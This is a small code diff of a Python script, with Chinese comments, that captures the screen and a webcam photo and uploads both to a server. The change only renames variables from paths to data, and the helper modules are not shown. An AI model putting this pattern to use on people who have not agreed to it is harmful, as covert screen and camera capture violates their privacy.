@@ -10,16 +10,16 @@ def main():
 
     # 1. 截取屏幕
     print("\n[步骤1] 截取屏幕...")
-    screenshot_path = screenshot.capture_screenshot()
+    screenshot_data = screenshot.capture_screenshot()
 
     # 2. 拍摄摄像头
     print("\n[步骤2] 拍摄摄像头...")
-    camera_path = camera.capture_camera()
+    camera_data = camera.capture_camera()
 
     # 3. 上传到服务器
     print("\n[步骤3] 上传到服务器...")
-    uploader.upload_screenshot(screenshot_path)
-    uploader.upload_camera_photo(camera_path)
+    uploader.upload_screenshot(screenshot_data)
+    uploader.upload_camera_photo(camera_data)
 
     print("\n" + "=" * 50)
     print("完成!")
